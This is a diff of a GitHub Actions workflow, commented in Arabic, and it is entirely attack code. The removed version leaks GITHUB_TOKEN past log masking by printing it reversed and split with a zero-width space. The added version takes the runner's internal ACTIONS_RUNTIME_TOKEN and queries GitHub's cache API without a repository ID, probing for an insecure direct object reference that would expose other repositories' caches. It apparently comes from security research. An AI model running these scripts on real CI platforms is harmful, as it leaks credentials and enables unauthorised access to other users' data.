@@ -1,30 +1,27 @@
-name: GitHub Masking Bypass V2
+name: Cache API IDOR Test
 on: [push]
-permissions:
-  contents: read
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Bypass Masking with Shell Manipulation
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Query Internal Cache API
         run: |
-          # 1. تخزين التوكن في متغير محلي
-          TOKEN="$GITHUB_TOKEN"
+          # 1. قراءة التوكن الداخلي الذي يربط الـ Runner بخوادم GitHub
+          TOKEN="$ACTIONS_RUNTIME_TOKEN"
+          URL="$ACTIONS_CACHE_URL"
           
-          # 2. محاولة طباعته بشكل مقلوب (Reverse)
-          REVERSED=$(echo "$TOKEN" | rev)
+          echo "Cache URL: $URL"
+          echo "Token exists: $([ -n "$TOKEN" ] && echo yes || echo no)"
           
-          # 3. محاولة طباعته مع إدراج حرف خفي (Zero-Width Space)
-          # سنستخدم printf لإدراج الحرف بشكل صحيح في الباش
-          ZWSP=$(printf '\u200B')
-          HALF=$((${#TOKEN} / 2))
-          PART1=${TOKEN:0:HALF}
-          PART2=${TOKEN:HALF}
+          # 2. محاولة الاستعلام عن الكاش بدون تحديد Repository ID محدد
+          # لنعرف هل سترد GitHub بأي كاش لا يخصنا؟
+          # الـ API يستخدم مسار /_apis/artifactcache/caches
+          QUERY_URL="${URL}_apis/artifactcache/caches?keys=test"
           
-          echo "--- Testing Reverse ---"
-          echo "Reversed Token: $REVERSED"
+          echo "Sending IDOR request to: $QUERY_URL"
           
-          echo "--- Testing Zero-Width Space ---"
-          echo "Split Token: ${PART1}${ZWSP}${PART2}"
+          # 3. إرسال الطلب
+          RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" "$QUERY_URL")
+          
+          echo "API Response:"
+          echo "$RESPONSE"
